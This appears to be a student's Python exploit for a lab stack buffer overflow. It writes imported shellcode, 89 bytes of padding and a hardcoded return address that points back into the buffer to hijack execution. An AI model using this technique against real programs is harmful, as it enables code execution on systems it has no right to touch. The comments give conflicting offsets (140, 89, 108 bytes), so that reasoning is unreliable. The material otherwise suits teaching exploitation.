from shellcode import shellcode
from struct import pack
import sys

# location of ebp is 0xfffe7738
# %ebp: 0xffffd0d8 0x08049f0b

# location of buf[] input (and therefore our shellcode) is 0xfffe76ac

# location of ret should be 0xfffe773c

# from this, it seems that our offset between the bp and buf[] is 140 bytes.
# we need to overwrite the return address to point to our shellcode



sys.stdout.buffer.write(shellcode)			#shellcode
sys.stdout.buffer.write(b"A"*89)			#89 bytes of padding until return address
							#89 implies buf[] is 108 bytes away from
							#ebp
							
sys.stdout.buffer.write(pack("<I", 0xfffe76ac))	#the true address of shellcode is
							# 140 bytes away from ebp. why did itmove?
